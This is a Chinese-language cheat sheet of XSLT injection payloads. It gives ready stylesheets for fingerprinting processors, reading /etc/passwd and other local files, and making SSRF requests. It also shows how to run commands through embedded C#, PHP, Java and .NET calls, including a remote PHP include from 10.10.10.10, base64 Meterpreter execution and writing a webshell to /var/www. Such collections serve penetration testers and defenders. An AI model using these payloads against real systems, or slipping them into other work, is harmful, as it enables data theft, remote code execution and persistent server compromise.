# XSLT注入

> 处理未经验证的XSL样式表可能会允许攻击者更改结果XML的结构和内容，包括从文件系统中包含任意文件，或执行任意代码。

## 摘要

- [XSLT注入](#xslt-injection)
  - [摘要](#summary)
  - [工具](#tools)
  - [利用方法](#exploit)
    - [确定供应商和版本](#determine-the-vendor-and-version)
    - [外部实体](#external-entity)
    - [使用document读取文件和SSRF](#read-files-and-ssrf-using-document)
    - [使用嵌入式脚本块进行远程代码执行](#remote-code-execution-with-embedded-script-blocks)
    - [使用PHP包装器进行远程代码执行](#remote-code-execution-with-php-wrapper)
    - [使用Java进行远程代码执行](#remote-code-execution-with-java)
    - [使用原生.NET进行远程代码执行](#remote-code-execution-with-native-net)
  - [参考资料](#references)

## 工具

## 利用方法

### 确定供应商和版本

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
	<xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<br />版本: <xsl:value-of select="system-property('xsl:version')" />
<br />供应商: <xsl:value-of select="system-property('xsl:vendor')" />
<br />供应商URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

### 外部实体

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    水果 &ext_file;:
    <!-- 遍历每个水果 -->
    <xsl:for-each select="fruit">
      <!-- 打印名称: 描述 -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>

</xsl:stylesheet>
```

### 使用document读取文件和SSRF

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
    水果:
	    <!-- 遍历每个水果 -->
    <xsl:for-each select="fruit">
      <!-- 打印名称: 描述 -->
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

### 使用嵌入式脚本块进行远程代码执行

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="urn:my-scripts">

<msxsl:script language = "C#" implements-prefix = "user">
<![CDATA[
public string execute(){
System.Diagnostics.Process proc = new System.Diagnostics.Process();
proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
proc.StartInfo.RedirectStandardOutput = true;
proc.StartInfo.UseShellExecute = false;
proc.StartInfo.Arguments = "/c dir";
proc.Start();
proc.WaitForExit();
return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
  --- 开始命令输出 ---
	<xsl:value-of select="user:execute()"/>
  --- 结束命令输出 ---	
  </xsl:template>
</xsl:stylesheet>
```

### 使用PHP包装器进行远程代码执行

执行`readfile`函数。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

执行`scandir`函数。

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
        </xsl:template>
</xsl:stylesheet>
```

# 利用 `assert` 执行远程 PHP 文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
		<xsl:variable name="payload">
			include("http://10.10.10.10/test.php")
		</xsl:variable>
		<xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

# 使用 PHP 包装器执行 PHP 米特纳特

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('Base64编码的Meterpreter代码'))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>
```

# 使用 `file_put_contents` 执行远程 PHP 文件

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
        </xsl:template>
</xsl:stylesheet>
```

### 使用 Java 进行远程代码执行

```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>
```

```xml
<xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
<xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>.
</xsl:stylesheet>
```

### 使用原生 .NET 进行远程代码执行

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>
```

## 参考资料

* [从 XSLT 代码执行到 Meterpreter Shell - 2012年7月2日 - @agarri](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html)
* [XSLT 注入 - Fortify](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection)
* [XSLT 注入基础 - Saxon](https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/)
